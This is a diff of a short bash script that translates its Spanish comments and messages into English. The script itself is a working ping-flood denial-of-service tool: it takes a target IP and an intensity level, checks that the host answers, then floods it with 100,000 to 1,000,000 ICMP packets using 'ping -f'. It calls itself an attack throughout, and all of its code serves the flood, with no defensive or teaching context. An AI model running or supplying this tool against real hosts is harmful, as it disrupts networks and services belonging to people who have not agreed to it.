@@ -1,44 +1,44 @@
 #!/bin/bash
 
-# Verificar que se pase la IP de destino
+# Check if the target IP is provided
 if [ $# -lt 2 ]; then
-    echo "Uso: $0 <IP objetivo> -n <nivel>"
-    echo "Niveles: 1 = Bajo, 2 = Medio, 3 = Alto"
+    echo "Usage: $0 <Target IP> -n <level>"
+    echo "Levels: 1 = Low, 2 = Medium, 3 = High"
     exit 1
 fi
 
-# Dirección IP del objetivo
+# Target IP address
 TARGET=$1
 
-# Leer el nivel de intensidad
+# Read the intensity level
 LEVEL=$3
 
-# Comprobación de conectividad
+# Connectivity check
 ping -c 1 $TARGET > /dev/null 2>&1
 if [ $? -ne 0 ]; then
-    echo "No se pudo alcanzar el objetivo: $TARGET"
+    echo "Unable to reach the target: $TARGET"
     exit 2
 fi
 
-# Definir el número de pings según el nivel
+# Define the number of pings based on the level
 case $LEVEL in
     1)
-        PING_COUNT=100000  # Nivel Bajo
+        PING_COUNT=100000  # Low level
         ;;
     2)
-        PING_COUNT=500000  # Nivel Medio
+        PING_COUNT=500000  # Medium level
         ;;
     3)
-        PING_COUNT=1000000  # Nivel Alto
+        PING_COUNT=1000000  # High level
         ;;
     *)
-        echo "Nivel no válido. Usa 1, 2 o 3."
+        echo "Invalid level. Use 1, 2, or 3."
         exit 3
         ;;
 esac
 
-# Iniciar el ataque de Ping Flood con el nivel seleccionado
-echo "Iniciando ataque de Ping Flood hacia $TARGET con $PING_COUNT paquetes..."
+# Start the Ping Flood attack with the selected level
+echo "Starting Ping Flood attack on $TARGET with $PING_COUNT packets..."
 ping -f -c $PING_COUNT $TARGET
 
-echo "Ataque completo."
+echo "Attack complete."
